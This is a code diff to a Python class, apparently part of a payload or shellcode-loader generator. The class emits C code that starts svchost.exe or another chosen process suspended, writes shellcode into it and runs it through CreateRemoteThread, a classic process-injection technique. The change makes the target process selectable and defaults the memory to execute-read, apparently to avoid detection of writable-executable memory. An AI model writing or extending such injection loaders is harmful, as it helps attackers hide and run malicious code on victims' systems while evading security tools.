@@ -1,6 +1,12 @@
 class rundll:
     def __init__(self, arguments):
-        pass
+        self.memoryPermission = 'PAGE_EXECUTE_READ'
+        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
+        if 'perm' in arguments:
+            if arguments['perm'] == 'rwx':
+                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -44,12 +50,12 @@ int executecode(){{
     SIZE_T NumberOfBytesRead;
     DWORD AddressOfEntryPoint;
 
-    CreateProcessA(NULL, (LPSTR) "C:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, (LPSTR) "{self.target}", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
 
-    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, {self.memoryPermission});
     WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
     
     hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
